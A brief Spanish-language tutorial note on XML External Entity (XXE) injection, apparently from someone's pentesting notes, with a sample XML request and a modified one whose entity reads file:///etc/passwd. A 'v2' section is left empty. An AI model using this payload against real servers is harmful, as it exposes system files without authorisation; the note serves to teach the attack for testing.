# XML External Entity Injection(XXE)


Ciertas aplicaciones tienen que postear ocasionalmente un documento XML para realizar una acción. El manejo no adecuado de esos documentos XLM puede llevar a lo que se conoce como XXE. Ocurre cuando un atacante es capas de usar la característica de ENTITY de un XML para cargar recursos fuera del sitio web del directorio.

## Explotación manual

- Original
```
<?xml version="1.0" encoding="UTF-8"?><root><name>xpc</name><tel>9999</tel><email>xpc@gmail.com</email><password>xpc</password></root>
```

- Modificada v1

```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name> xpc</name><tel>9999</tel><email> &xxe;</email><password>xpc</password></root>
```

- Modificada v2




## Referencias:

- [PayloadsAllTheThings XML External Entity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)